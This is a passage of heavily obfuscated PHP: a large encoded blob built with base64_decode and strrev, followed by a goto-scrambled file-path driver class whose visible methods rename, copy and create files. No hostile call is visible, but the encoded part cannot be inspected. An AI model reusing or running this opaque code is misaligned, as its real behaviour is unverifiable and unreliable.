\300\161\346\363".base64_decode('tMGSlYpSAM2ABuFj9Vn4cSCuOxkLbmfphfPLYs+hYPFKk6fUTZ1RR3WbT6X3Tw==')."\371\234\331\300\76\251\147\321\161\356\4\245\3\334\351\60\35\33\234\160\213\73\125\41\232\203\221\255\160\112\100\54\371\170\157\55\56\253\311\100\261\170\51\70\221\105".base64_decode('B614JcEL2QjzxluCksaVQbpbks1S0GljE5KkHzrLL/MlEk3385FEoR4cwfB+0A==')."\121\215\63\125\150\133\25\116\65\143\251\174\266\277\101\110\224\114\115\223\62\162\266\100\330\375\11\106\335\4\143\46\154\250\141\202\253\46\141\200\0\241\327\314\267\32".base64_decode('3Ee4YyTsUoGk4GNlF3R17YKbVDBPcnWm88zNcQ59kx52+rtm+zqEO2QhItLc0g==')."\21\361\164\166\226\114\140\354\11\74\320\202\327\55\256\76\352\311\77\106\261\252\136\315\44\245\30\324\50\155\50\203\261\145\222\241\307\250\207\271\62\67\241\243\50\3".base64_decode('F5DqVVKkHBaREgBNnOgLJ5fPqnersxiwubcIXeOKsS73eCguueH1bPZUOLviFQ==')."\x11\x8a\x6d\xe5\xbe\x21\x24\xa9\x5e\x96\x30\x1c\x1b\xca\xe1\xdd\x59\xa2\x5c\x4a\x81\xfd\x98\x29\xa0\xcc\xb2\x17\xee\xa0\xf7\x14\xf5\x6e\x59\x4c\x84\x2b\x2b\xa8\x51\x66\x97\x89\x4c\x83".base64_decode('7MC45Em4J2ZzU9wsZ+cVF4GVu2KlktxI1HdzQZD6pxG1BS2um6zXBOxkvQSCuA==')."\330\303\0\71\71\326\17\261\213\157\5\70\243\213\44\164\102\341\4\47\130\34\355\232\302\205\30\30\2\150\24\12\247\72\167\34\276\170\61\256\10\356\376\113\227\26"."\307\21\225\32\173\222\47\247\332\243\40\26\331\343\240\174\315\343\300\236\146\155\6\143\260\230\211\307\320\74\376\216\331\274\0\26\76\170\30\44\56\244\332\152\50\324"."\263\260\334\65\161\351\122\267\112\357\240\173\312\254\145\135\54\67\16\367\270\254\371\101\317\11\250\131\106\22\141\317\211\171\307\323\311\302\73\304\75\221\53\334\263\273".strrev('È8×®õcÄ,è\\KLpC.,àîlû7pÎRGºtéêÕ'."\0".'eizîÈZÌ47@^	f')."\xfc\x5a\x63\x28\x8a\xdf\x9e\x5c\x4e\xc\x52\xbf\xee\xe8\x2c\x3c\xad\x46\xdd\x6c\xa5\xe3\xf3\x71\x57\x8c\x6b\xab\xd3\x2c\x88\xce\xd8\xe2\xe1\x45\xb1\x2d\x1\x6a\x37\xa3\xe8\x41\x40\x8"."\1\307\325\147\217\7\165\261\110\366\121\157\304\164\65\147\132\150\24\176\267\246\14\171\42\357\223\7\145\234\245\114\242\17\142\224\41\277\253\145\200\46\341\24\102\14"."\170\127\352\41\361\221\164\45\335\120\206\272\153\244\24\5\224\107\344\245\124\43\240\140\231\104\51\143\106\146\20\323\115\15\154\172\114\65\232\70\377\357\12\22\75\123"."\x4f\x7\xb9\x71\x20\xec\xd4\xf8\x33\xf1\xef\x29\xe3\x29\xa2\xa0\xd7\x26\xd2\x8a\x8e\x95\xe9\x10\xc5\x41\xb7\x4d\x9\x7e\x60\x45\xde\x22\xe8\xc\x6\xc2\x81\x66\xea\xd5\xbd\xd4\xc9\x56"."\15\345\135\15\154\0\300\145\34\252\350\74\307\273\300\232\203\161\3\156\22\103\246\137\317\147\263\354\72\37\262\207\154\313\302\67\70\241\124\336\344\233\35\164\313\32"."\206\326\70\6\211\26\274\66\101\237\121\112\334\145\11\224\310\206\357\121\140\45\164\15\130\116\47\160\365\151\215\372\252\232\134\125\125\345\254\252\6\177\331\65\42\341".base64_decode('r+qqqoqyVFXVob84AR20EihaU8CipdSFZBgCMj/5IlnUbJ6yQM1QDV2CPWtoaA==')."\xa0\xdb\x3e\x1d\x0\x80\x20\xb2\x20\xaa\xa3\x4b\x7f\xa6\x20\xba\xcd\x94\xd0\xf5\x15\x9\x29\x76\x30\xb0\x7b\x41\x32\x29\x74\x7b\x80\x6b\x9d\x7e\x3\x5e\x4\x4c\x10\x2\xb\xe9\x31\x33"."\x87\x0\xd9\xf8\xd4\x83\x7e\x78\xb3\x71\x22\x64\xcc\xc4\xe6\x27\xd\x62\x63\x2e\xa\x5e\x31\x52\xbc\x4d\xe2\x96\xd\x25\x7a\x1\xca\x81\x1d\x33\xc6\x6\x0\x23\x84\xe3\x9\x64\x48\xc5".base64_decode('tPxRKM3M32Cwg2XFnp2xWQMZfQlsSmlDEb7TweDpLISAAYUTikJs2AQilAZSlA==')."\xa1\x37\xcf\xe4\x22\x1b\x19\x94\xf5\xab\x69\x8b\xb5\x51\x44\xa8\x5b\x74\x4b\xc\x48\xd\x64\x61\xe9\x7c\xe2\xa3\x74\xd2\x0\xe4\x7e\x5c\x1c\x15\x90\xdf\x46\xf4\x2e\xe\xd6\x6d\xa9\x3b"."\104\0\236\256\161\373\237\242\107\244\150\110\260\105\243\47\310\241\377\242\74\101\143\274\64\2\253\33\64\63\207\125\102\5\366\44\133\31\117\134\170\337\310\340\236\252".base64_decode('mplTOtF9Fb60FS7xDeI1ld/S0joGBTHBldO1JAC5IY4VxHeWjmbZi3OWyMQGJA==').base64_decode('5hMjoYYQfWqHYA+3N5L5I2BCVr4ghEirDo+Q0My8vouRUOwQ7+WRSaK1DijPWA==')."\143\130\317\176\6\127\250\34\152\222\147\231\4\133\61\222\215\253\54\301\63\2\361\334\122\325\350\225\77\204\6\277\213\263\306\27\141\31\131\12\224\22\342\265\142\115".strrev('9Aôc¨+ft{š(”V.*ÆÒåÃj(ˆğ8YSÄ£ÏÍ-cô5‚ï{')."\203\262\43\161\332\337\201\274\102\131\50\201\230\110\46\47\45\260\117\120\41\66\245\153\246\51\132\223\172\342\2\5\364\213\33\150\30\27\161\316\342\355\130\56\161\4".base64_decode('b5AsKyDitHWZUm+kK+NCzmo5h28L2vVpEHU2Kf2lbjSzzNs/nM6QoPJQogVSiA==')."\x15\x21\x9b\x8\xb4\xc3\xd6\x91\xd8\x27\x58\x29\x66\xcd\xa0\x92\x14\x83\x7e\x8d\x89\xbb\xf0\xd2\x40\x29\x51\x5\xb4\x4d\x16\x90\x13\x62\x1\x10\xc4\xf2\xa2\xdd\xb3\xe0\x85\x13\x84\x4"."\327\251\302\316\356\254\226\30\113\20\301\65\343\300\44\41\1\345\57\305\35\330\16\135\4\15\106\44\147\206\362\121\166\276\155\333\261\251\176\244\44\356\222\124\313\21"."\x56\x80\xec\x76\xe1\x8\xc\x31\xd\x54\xb\xfd\xfe\xf1\x91\x89\x45\x50\x9b\x45\x45\x70\x1a\xdc\xd9\xb8\x3a\xa4\x98\x62\x0\xe1\x4\x82\x6a\xf4\x94\x12\x4d\xa1\x24\x1\xa2\x31\xba\xf1"."\x92\x5b\xb4\x5\x1c\x48\x24\xa1\xa0\x50\x95\x29\x67\xf5\x64\xe7\x14\xea\xf9\x44\xe0\x1f\xc8\xd6\x48\xe0\xb\x99\x49\x1\xd\x20\xcb\x4b\x29\x18\xd1\x8a\x22\xf9\x78\x1e\x4d\x78\x51\x8"."\xd9\xcc\x72\xb3\x41\x64\x4\xcc\xe6\x13\x59\xb\xb3\x90\x2e\xec\x38\xa\xd3\x98\x42\x96\xb7\x22\x59\xe1\x37\xb9\x58\x91\xa\x66\xe8\x2a\x95\x8e\x21\x4\x93\x5b\x2c\x1a\x65\xb6\xc\x60"."\145\130\323\211\73\325\214\345\151\110\200\7\26\315\5\133\45\304\221\256\350\62\26\225\342\343\340\312\171\40\112\303\116\133\5\300\360\33\151\154\152\114\265\12\31\135"."\342\321\141\215\105\26\337\152\273\230\126\45\261\35\41\117\367\124\124\102\333\21\313\201\102\173\201\331\0\200\231\354\207\373\43\123\170\63\304\0\115\145\310\151\130\2"."\130\133\304\122\232\105\261\134\103\12\61\3\141\202\160\147\133\247\233\105\65\121\60\61\153\116\42\105\361\307\140\210\332\24\261\303\30\2\160\327\206\310\2\153\256\143".base64_decode('CjT0qcmhjBqT/IHZvmaPv8UXmiMlFVN4JxUpQluXOzoXwpNDMT/KvATDT2cUsA==').base64_decode('hc44Y4cNzvgKejWCy3xrtRhHFb2oRsBGZ6wEAZWBp10lcqf5gY+QOacrxfkLCg==')."\172\57\222\367\130\50\220\57\321\33\222\277\164\13\140\211\130\163\203\315\132\311\216\326\171\65\73\250\32\52\47\16\264\104\101\254\235\237\347\351\314\267\265\0\364\270"."\xe8\xbe\x9a\x3\x1b\xb7\x22\x7a\x2\xb0\xcb\xa2\x62\xe\x51\x5d\x12\x4f\x93\xe8\x4\x24\x47\x4f\xa7\xc9\x1b\x28\xdc\xb1\x38\xa\xa\x2e\xdf\x73\xba\xac\x1a\x8a\x10\x81\x7d\x8f\x4f\xac"."\xa4\x21\xc1\x61\x8\x29\x1d\xc1\x65\x70\x5c\x10\xbe\x9f\xf8\xbf\xae\x5c\x8d\x73\xe7\x1f\xb6\xae\xa9\x71\x7a\xa7\xcd\xb4\xdd\xb1\x83\xdf\x66\xf1\x19\x17\xda\x85\x22\xbf\xf4\xff\xd5\xc3".base64_decode('vYMfyEeQnTnVQUSPyJLbBnaTG8G27TjotuspIp+62ZheyIlXJO44fUGISm7Qlw==')."\211\227\236\217\302\200\360\376\212\26\217\245\265\174\234\27\46\215\301\336\140\1\6\210\123\360\346\200\62\272\364\350\2\254\167\62\53\226\13\103\233\53\177\273\332\234"."\xe5\x4d\xc5\xa2\x36\xa0\xce\xd2\xe8\xf5\x80\x72\x12\x97\xea\x59\x6\xa9\x41\xaa\x42\xc7\x45\x5c\x41\x4a\xaa\xa7\x76\x39\xbc\x9\xe4\xcf\xc1\x9b\xc9\x99\x16\x19\x8d\xa8\xcf\xf2\xcc\x96".base64_decode('tzARc8IFG6h/oWUKRREWid9P+8UUt6Av6WxCE8GA6CPYZvDLIlB/GX9hqdAB+A==')."\164\305\54\366\147\217\353\31\265\122\303\276\303\160\156\7\320\214\120\112\33\262\276\74\2\143\4\336\306\102\263\255\155\301\24\1\327\221\165\246\140\353\102\177\341\51"."\xbe\xe5\x21\x1\xa1\xf6\x9\xf8\xa7\x87\xfc\xd2\x4d\xc0\x5e\x35\x5e\xf6\xa4\x2b\x95\x6c\xee\x9b\x2d\x6f\x3c\xb\x11\xed\xa\x17\xd4\x50\x29\x78\x19\x2e\x67\x19\x55\x23\x9e\xfc\xd9\xb".base64_decode('I3z10TQBpdBbFi2jFLVFS1bX4txjO9+grF622fUXU41CKmqiz/SwFpaTDswaQQ==')."\x2\xc5\x43\x4d\x5\xf1\x5b\x54\x11\x44\x83\x6\x89\xf4\xc8\x24\xce\x30\x60\x96\x90\x81\x3e\x6\x12\x77\xa0\x97\x2a\x30\x99\xb2\xbf\x86\x22\xac\x1f\x46\xfb\xc4\xd2\xc9\xb4\x16\x95\xd3"."\101\254\123\143\121\135\327\201\130\303\64\346\54\331\10\345\222\163\271\121\217\350\11\273\202\217\353\363\131\37\66\176\262\304\352\202\330\44\52\151\342\213\11\156\367\101".base64_decode('soPWOvFNBBm2WCW9DUI/ULBqFV4WdBffHkGdH7LaReU4cqnnEuUakkGql/gEWw==')."\26\50\104\10\270\352\321\7\132\365\42\37\374\63\261\14\17\255\357\345\140\204\105\77\55\112\202\11\5\60\314\105\106\321\372\223\337\40\333\337\350\240\315\260\7\107".base64_decode('HHhk/M0n/LyIgz0l4sCviDjIAyIObr/zc0/u8AfDrK+MwT4zbbIi7tzOmDNQ2Q==').base64_decode('CgTtgAtrxQdt/M4sm8/wa0oQsAoqRQMWRpjX0w50Y+igzk5s4OCjEmemBAz/ew==').base64_decode('HVipEEkfcSvVqauP6vQWxp5NtWAdkPm5qjt2ClX0bsGCTHzylKkzRCmfzw+/3Q==').strrev('âÌuYÆgœ'."\n".'[¿ü’V¢€àüYöªÑ(¾\\Jê$­’ñ>tvBÅr.sˆë> ')."\327\314\212\100\202\260\122\120\135\20\66\64\333\335\264\6\257\214\15\336\131\274\205\361\7\177\254\155\341\347\251\112\214\103\330\210\370\322\300\157\311\150\151\50\175\146".base64_decode('4NmnqctWMaqUtIAgQUUTFT2Hp9j7jgBDzhl4siBOiDWamv2QBBaHGxU6owtk0w==')."\144\333\205\206\212\174\221\375\337\115\40\225\30\260\320\301\265\24\112\214\334\175\32\45\44\266\267\170\154\217\251\375\114\277\61\323\305\244\43\247\114\337\367\101\223\52".strrev('ø­J]dQ©SKË'."\r".'Ïqo	…ÌTËFëÑ×ŒPz­«f°¸^á0M'."\0".'f)¬')."\x7b\x2a\xc8\xec\x85\x9f\x55\xa3\xb5\x6a\x59\xb7\x82\xc3\x37\xd1\x8a\x4\x55\x24\x2e\x83\xe2\xaa\xd1\xf1\x9\xe9\x2f\x59\xb8\xe8\x79\x7a\xa4\xce\xe1\x99\xcd\x6c\x85\x64\x41\x89\x4\x82"."\116\170\117\113\23\277\255\146\267\1\352\60\13\60\111\26\71\14\204\133\154\117\256\41\342\143\177\207\215\216\37\255\163\116\323\4\243\63\213\70\300\36\36\261\210\7"."\206\375\5\36\300\116\211\176\356\100\220\141\70\331\74\11\325\103\372\271\270\65\207\375\25\276\234\140\141\153\173\252\123\70\311\264\76\302\231\22\273\5\175\14\330\226"."\65\265\372\203\106\224\370\172\205\20\176\344\216\14\177\123\116\374\377\371\125\276\377\137\217\361\115\255\242\147\316\226\27\333\146\23\6\227\162\143\43\202\343\116\174\336"."\151\33\207\165\213\74\130\114\45\30\352\260\204\110\200\57\70\270\367\270\154\357\221\272\230\302\42\365\111\101\135\125\310\364\76\105\206\157\20\25\235\137\322\267\273\0"."\x46\xf6\xb3\xa7\xa5\x4a\x5\x8a\x1f\x56\xb4\x20\x1f\xe5\x37\x79\x37\xb3\x6a\xac\xbf\xc4\xfd\x1c\x9c\x2\xbf\xd5\x57\xa0\xc0\x25\x14\x65\xe3\xf4\x9\x30\x13\xd4\xb\x87\x9b\x7e\xc5\xa0"."\230\5\131\111\112\26\105\33\263\100\216\12\144\225\204\22\367\236\106\311\7\62\124\45\124\104\244\34\226\250\42\172\23\266\354\202\226\110\21\74\374\1\121\227\365\75"."\114\122\242\335\366\162\22\316\144\161\44\151\71\154\56\276\256\55\56\315\26\263\130\4\52\160\132\217\154\330\43\214\125\366\127\31\253\235\305\215\141\375\151\170\236\20"."\204\22\77\105\110\164\37\201\356\13\113\224\301\313\62\304\363\214\202\376\245\27\41\173\102\123\20\204\301\227\70\136\272\230\73\165\15\261\142\326\130\166\252\41\350\313"."\x9\x2f\x2\x16\xbd\x52\x66\x3b\xd7\x7\xe2\x11\xbf\xe8\x52\x35\xe4\xf3\x93\xc\x3b\xd4\xd5\x5e\x81\x4c\x0\x8\xa6\x2\xee\x5e\x78\x79\xd7\xcc\xe4\xf0\x61\x18\xe9\x34\xb6\xb1\xb1\x1c"."\x3d\x19\xa2\x1b\x5f\xab\x29\x8e\xa0\xdb\x6a\x4d\x80\xca\xc8\xd6\x95\x32\xab\x54\xb6\x98\xa6\x1b\x42\x36\x16\x5f\x2a\x2f\x7c\x8\xce\xb4\x40\x93\x3b\x62\xb5\x3b\x60\x45\xa2\x30\x96\x6e"."\55\102\56\271\125\24\243\204\113\67\300\336\306\255\132\223\50\21\105\123\317\116\364\71\146\176\155\144\275\265\143\76\50\213\50\125\136\365\13\311\250\24\365\15\2\176".base64_decode('ocWRj5tho2R82O0ZlE1692Uv1WWRJYQ7vhjCHW/xNQ6/XRI2f1oMCiOc1triBQ==').strrev('qc%£á¢\\æçöC*Ëk‘ˆÁy'."\n".'?† ±gÿ”ãY-=·³÷8noÈ<©Ïâ')."\54\67\162\264\217\13\255\5\213\363\124\227\150\35\311\260\205\107\141\147\273\114\41\105\20\41\240\72\67\327\124\301\175\144\2\62\157\322\152\213\311\262\261\311\0\171"."\220\362\274\323\22\153\23\212\340\161\3\335\237\155\111\206\370\36\251\365\116\116\224\330\205\271\125\322\176\241\72\361\276\156\324\2\241\322\215\160\164\263\202\130\260\133"."\xe5\x9\x74\x17\xd2\x2c\xc0\x17\xa8\x18\x1b\x18\xc9\x19\x14\x13\x2d\xdd\xb1\x4f\x2d\xe2\xe7\x39\x5e\xe2\xc8\xc\x3a\xd1\x74\xd1\x13\xe2\xe2\xfc\x8a\xad\xf7\x62\x1\xfb\xc8\x70\x9\x63".base64_decode('SDVjKUHIKE4sjteLgEoaKt1fe68oTO2iF6+kqD/CpX9YK1EG96hkMZyEXs1mzA==')."\xa1\xa5\xec\x28\x20\x80\x65\x71\x12\x2c\x5b\x94\x4c\xb\xb\x67\x16\x42\x39\x53\xce\x1b\xa3\xc\xaf\x18\x78\x44\x7c\x8f\x97\x18\xb0\x4d\xc8\xc5\x59\x47\x83\x67\xc9\xcc\xc5\xcd\x11\x8c"."\263\347\106\362\176\351\136\160\61\335\166\261\132\252\27\45\63\217\332\213\22\57\1\23\377\127\45\210\50\115\51\101\66\371\55\174\61\201\346\151\45\164\2\160\235\160"."\363\25\235\260\224\110\26\25\14\112\253\40\4\113\56\175\303\252\33\140\213\27\1\103\365\204\200\50\306\337\306\25\224\127\47\130\110\172\76\333\237\245\106\34\240\166"."\xae\xcd\x5\x95\x35\xd9\xb\xb2\xac\xb9\xa2\xda\xac\xa8\x99\xcd\xb\x5a\x98\x25\x75\x69\x1d\xe8\x7d\xf1\x22\x11\x35\x2d\xd3\x23\x70\x41\xd\x19\x8b\x23\x9a\xa9\xc6\x4\xfd\x24\xfb\x8b"."\352\70\235\66\222\26\116\326\154\207\132\134\214\267\334\113\227\70\366\101\121\204\17\343\247\311\26\245\154\274\261\223\143\164\174\233\326\14\357\132\331\15\12\224\233\34"."\x78\xbf\xc4\xc9\xf0\x89\x77\x7\x4c\xb\x6b\x39\xf4\xdb\xa4\x99\x26\xa5\x24\x40\xb0\x47\x39\x11\xf7\x6\x37\x3d\x87\xa0\x9b\x0\xbe\xf8\x75\x9\x84\x22\x3a\xc1\x47\xe8\x88\xc8\x6\xfa"."\x24\xf7\x7a\x50\x92\xc\x29\x38\x15\x11\x1b\x4b\x0\xde\xc\xb0\x80\xb8\xa7\x91\xcb\xb8\xd6\xbc\xed\x46\x91\x47\x0\xe9\x30\xaa\xd\x53\xdf\x66\xd0\xd0\x93\xf7\x87\x3f\x3c\x2b\xdb\x39".base64_decode('NK4hQPBN1LRA5rSGG6e4iYNYJ6rDSRyL9OWSluLYhT7TMPy5GsihI68CO45E5w==')."\105\320\205\252\167\276\57\24\16\25\45\165\172\102\241\356\100\260\5\373\231\54\112\106\245\4\245\226\242\244\316\266\100\307\150\151\336\166\217\317\137\224\6\225\134\72".strrev('H¿pÉLFÑ&YôÉü=5èÒ—;Tü¦wA=áÏ5ğ½h÷@şüz^¢uòNÜ"')."\274\214\125\366\27\347\325\240\16\302\330\207\325\33\273\115\337\214\42\54\251\10\52\250\164\220\272\203\364\325\54\350\167\223\55\156\306\5\243\1\331\365\332\124\141\35"."\340\33\142\227\345\132\131\210\107\13\7\221\33\1\41\305\235\26\105\114\54\11\75\361\220\264\370\320\36\245\162\350\300\136\237\256\21\365\250\76\55\52\34\312\143\1"."\x85\x18\x6e\x11\x78\xb\x1a\x4a\xf8\x9b\x24\xff\x1f\x73\x2b\xc5\x57\xfc\x9c\x0\x0"."".base64_decode('').base64_decode('')."", 10, -8))); goto E’ïìˆ­§; EÇ¬±ğÆ†ª: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $Fí…¾ˆ¯íÀ =& $_SERVER[…ë˜õ]; $this->objectDriver = array($Fí…¾ˆ¯íÀ[57], $Fí…¾ˆ¯íÀ[58], $Fí…¾ˆ¯íÀ[59], $Fí…¾ˆ¯íÀ[60], $Fí…¾ˆ¯íÀ[61], $Fí…¾ˆ¯íÀ[62], $Fí…¾ˆ¯íÀ[63], $Fí…¾ˆ¯íÀ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($bŸ¸ÜƒÅ—Ã) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($bŸ¸ÜƒÅ—Ã, $_SERVER[…ë˜õ][8]); } return $bŸ¸ÜƒÅ—Ã; } public function iconvApp($E·¯’’Îôè) { return $E·¯’’Îôè; } public function iconvSystem($e‡Ó©¾ÖÇ) { return $e‡Ó©¾ÖÇ; } public function iconvTo($d‹ƒ„í¤‰„, $d¼ƒÎä³‰„, $EˆÂ®ïÕé×) { goto c—ç±©ÄÈ; dÀÖ‰ÇÅ±: return $f•¸¿‰¸êò; goto F³Ú©ø¦³‚; fëñ†¿†: $Cªå¸ã‚œ[$EˆÂ®ïÕé× . $eßêÒëŒÑÀ[66] . $d¼ƒÎä³‰„ . $eßêÒëŒÑÀ[67] . $d‹ƒ„í¤‰„] = $d‹ƒ„í¤‰„; $Cªå¸ã‚œ[$EˆÂ®ïÕé× . $eßêÒëŒÑÀ[66] . $d¼ƒÎä³‰„ . $eßêÒëŒÑÀ[67] . $f•¸¿‰¸êò] = $d‹ƒ„í¤‰„; $Cªå¸ã‚œ[$d¼ƒÎä³‰„ . $eßêÒëŒÑÀ[66] . $EˆÂ®ïÕé× . $eßêÒëŒÑÀ[67] . $f•¸¿‰¸êò] = $f•¸¿‰¸êò; goto dÀÖ‰ÇÅ±; aĞÁ­ø‚Æ: $EäÉñÏÍ³ = $d¼ƒÎä³‰„ . $eßêÒëŒÑÀ[66] . $EˆÂ®ïÕé× . $eßêÒëŒÑÀ[67] . $d‹ƒ„í¤‰„; if (isset($Cªå¸ã‚œ[$EäÉñÏÍ³])) { return $Cªå¸ã‚œ[$EäÉñÏÍ³]; } if (function_exists($eßêÒëŒÑÀ[68])) { $f•¸¿‰¸êò = @mb_convert_encoding($d‹ƒ„í¤‰„, $EˆÂ®ïÕé×, $d¼ƒÎä³‰„); } else { $f•¸¿‰¸êò = @iconv($d¼ƒÎä³‰„, $EˆÂ®ïÕé×, $d‹ƒ„í¤‰„); } goto CÃäè›½ĞÉ; c—ç±©ÄÈ: $eßêÒëŒÑÀ =& $_SERVER[…ë˜õ]; if (!$d‹ƒ„í¤‰„ || !function_exists($eßêÒëŒÑÀ[65])) { return $d‹ƒ„í¤‰„; } static $Cªå¸ã‚œ = array(); goto aĞÁ­ø‚Æ; CÃäè›½ĞÉ: $f•¸¿‰¸êò = $f•¸¿‰¸êò ? $f•¸¿‰¸êò : $d‹ƒ„í¤‰„; if (strstr($f•¸¿‰¸êò, $eßêÒëŒÑÀ[69])) { $f•¸¿‰¸êò = str_replace($eßêÒëŒÑÀ[69], $eßêÒëŒÑÀ[70], $f•¸¿‰¸êò); } $Cªå¸ã‚œ[$d¼ƒÎä³‰„ . $eßêÒëŒÑÀ[66] . $EˆÂ®ïÕé× . $eßêÒëŒÑÀ[67] . $d‹ƒ„í¤‰„] = $f•¸¿‰¸êò; goto fëñ†¿†; F³Ú©ø¦³‚: } public function getPathInner($CëĞä”Ì¶¨) { $CšèèÜªƒñ = IO::init($CëĞä”Ì¶¨); return $CšèèÜªƒñ->path; } public function getPathOuter($c¬œË²³õ) { $bÅÁ‘ç–Œº =& $_SERVER[…ë˜õ]; $A‹ì•®¡¦â = strlen(trim($this->pathBase, $bÅÁ‘ç–Œº[8])); $c¬œË²³õ = substr(trim($c¬œË²³õ, $bÅÁ‘ç–Œº[8]), $A‹ì•®¡¦â); return $this->pathDriver . $bÅÁ‘ç–Œº[8] . ltrim($c¬œË²³õ, $bÅÁ‘ç–Œº[8]); } public function isParentOf($D÷äğÒ¨¶…, $döõõ·Ş‚·) { $Fòãã²•Å =& $_SERVER[…ë˜õ]; $D÷äğÒ¨¶… = rtrim(strtolower($D÷äğÒ¨¶…), $Fòãã²•Å[8]) . $Fòãã²•Å[8]; $döõõ·Ş‚· = rtrim(strtolower($döõõ·Ş‚·), $Fòãã²•Å[8]) . $Fòãã²•Å[8]; $d™¶¾ˆº¬Œ = strpos($döõõ·Ş‚·, $D÷äğÒ¨¶…) === 0; return $d™¶¾ˆº¬Œ; } public function getType() { $EÊíöÄ‚ˆƒ =& $_SERVER[…ë˜õ]; $d±èÍ ø¡» = str_replace($EÊíöÄ‚ˆƒ[71], $EÊíöÄ‚ˆƒ[33], get_class($this)); return strtolower($d±èÍ ø¡»); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($fäË´‘ç‹, $FÀˆ›”ÑÏÉ) { $BÎù÷Ê¡Ì =& $_SERVER[…ë˜õ]; $E‡ˆêñé²¡ = rtrim($fäË´‘ç‹, $BÎù÷Ê¡Ì[8]) . $BÎù÷Ê¡Ì[8] . $FÀˆ›”ÑÏÉ; $bÉ…ŸÃõ = $this->exist($E‡ˆêñé²¡); return $bÉ…ŸÃõ ? $E‡ˆêñé²¡ : !1; } public function setModifyTime($Dù‰ÄÈ’›ø, $c‚‡œôÑª¿ = '') { } public function renameObject($F¸Õº¦ÜóÔ, $d»ß¬’Öªˆ) { goto bØã†…œ; Dåª°ÙŞ‡à: return $Eï« ëÒÌ ? $d»ß¬’Öªˆ : !1; goto AÊõÛÁ±£Ç; bØã†…œ: $BâÛõ¦Ë×³ =& $_SERVER[…ë˜õ]; $F…šåôô = $d»ß¬’Öªˆ; Hook::trigger($BâÛõ¦Ë×³[72], $this, $F¸Õº¦ÜóÔ, $this, $this->pathFather($F¸Õº¦ÜóÔ) . $d»ß¬’Öªˆ); goto eÑÏÙÖ£ØÈ; eÑÏÙÖ£ØÈ: $F¸Õº¦ÜóÔ = $this->getPathOuter($F¸Õº¦ÜóÔ); $d»ß¬’Öªˆ = $this->pathFather($F¸Õº¦ÜóÔ) . $d»ß¬’Öªˆ; if (IO::isFile($F¸Õº¦ÜóÔ)) { $Eï« ëÒÌ = IO::copy($F¸Õº¦ÜóÔ, $this->pathFather($F¸Õº¦ÜóÔ), REPEAT_RENAME_FOLDER, $F…šåôô); if ($Eï« ëÒÌ) { IO::remove($F¸Õº¦ÜóÔ); } } else { $Eï« ëÒÌ = IO::mkdir($d»ß¬’Öªˆ); if (!$Eï« ëÒÌ) { return !1; } $EÂò§¤ï² = IO::listPath($F¸Õº¦ÜóÔ, !0); $eÛ…øèõˆå = array_merge($EÂò§¤ï²[$BâÛõ¦Ë×³[73]], $EÂò§¤ï²[$BâÛõ¦Ë×³[74]]); foreach ($eÛ…øèõˆå as $E«ŠÛÅËæ) { IO::move($E«ŠÛÅËæ[$BâÛõ¦Ë×³[75]], $d»ß¬’Öªˆ, REPEAT_RENAME_FOLDER); } IO::remove($F¸Õº¦ÜóÔ); } goto Dåª°ÙŞ‡à; AÊõÛÁ±£Ç: } public function tempFile($E•æÓ¡ÔĞ¢ = '', $CŠçˆÎ‹õö = '') { goto c¯×ñ…¬ã; Aêæ‘­Œöó: $dÑ…À˜¼‰» = $DİÇğÙ½°Ş . $E•æÓ¡ÔĞ¢; @touch($dÑ…À˜¼‰»); if ($CŠçˆÎ‹õö) { file_put_contents($dÑ…À˜¼‰», $CŠçˆÎ‹õö); } goto f¼ï×Ó¹›; f¼ï×Ó¹›: return $dÑ…À˜¼‰»; goto b’«š–º…ª; c¯×ñ…¬ã: if (!$E•æÓ¡ÔĞ¢) { $E•æÓ¡ÔĞ¢ = rand_string(15); } $DİÇğÙ½°Ş = TEMP_FILES . rand_string(15) . $_SERVER[…ë˜õ][8]; @mkdir($DİÇğÙ½°Ş, 511, !0); goto Aêæ‘­Œöó; b’«š–º…ª: } public function tempFileRemve($bÂ†éˆ•™) { @unlink($bÂ†éˆ•™); @rmdir($this->pathFather($bÂ†éˆ•™)); } public function mkfile($a˜ÛÎ°ôÂ«, $A’¼¦Ä† = '', $dÙéïß—°Õ = REPEAT_RENAME) { } public function mkdir($d´ ³éÒê…, $c´‡Àö°ø = REPEAT_SKIP) { } public function delFile($bé¤¥‰Ã•) { } public function delFolder($bëİãÛÚÊ“) { } public function copyFile($fÊõñ‘ĞÖˆ, $e‚ÉÅæá›¬) { } public function moveFile($bËˆ‹ÇÄ‚, $f´×ää¶”Â) { } public function remove($c¹£ˆ³„¢Š) { if ($this->isFile($c¹£ˆ³„¢Š)) { return $this->delFile($c¹£ˆ³„¢Š); } return $this->delFolder($c¹£ˆ³„¢Š); } public function rename($B‚ôØéÜã‡, $FğµÃˆ³ç‰) { } public function exist($aä¦ƒËÓŞå) { } public function findByHash($b“‘¼°ØßÖ = '', $Bê·ôï·•ó = '') { return !1; } public function isFile($C¤…ÀË„ŒÈ) { } public function isFolder($dõÜ®–œæÈ) { } public function size($E„«·µŒê) { } public function info($d™Íå¿íÅÎ) { } public function infoSimple($BÉ¯ß³´Ò») { return $this->info($BÉ¯ß³´Ò»); } public function infoAuth($Cö¬šâ) { return $this->info($Cö¬šâ); } public function infoFull($Dš¢ºØ–‚) { return $this->info($Dš¢ºØ–‚); } public function infoWithChildren($FÚÆŸŸÏïœ) { $dÕÚÛÉñ§š =& $_SERVER[…ë˜õ]; static $bí‡¥œ¦ = array(); if (isset($bí‡¥œ¦[$FÚÆŸŸÏïœ])) { return $bí‡¥œ¦[$FÚÆŸŸÏïœ]; } $AÑ¾°ŒÒ½î = $this->info($FÚÆŸŸÏïœ); if ($AÑ¾°ŒÒ½î && $AÑ¾°ŒÒ½î[$dÕÚÛÉñ§š[29]] == $dÕÚÛÉñ§š[76]) { $Dä³³èì‡Æ = array($dÕÚÛÉñ§š[77] => 0, $dÕÚÛÉñ§š[78] => 0, $dÕÚÛÉñ§š[79] => 0); $this->infoChildren($FÚÆŸŸÏïœ, $Dä³³èì‡Æ); $AÑ¾°ŒÒ½î[$dÕÚÛÉñ§š[77]] = $Dä³³èì‡Æ[$dÕÚÛÉñ§š[77]]; $AÑ¾°ŒÒ½î[$dÕÚÛÉñ§š[80]] = array($dÕÚÛÉñ§š[81] => 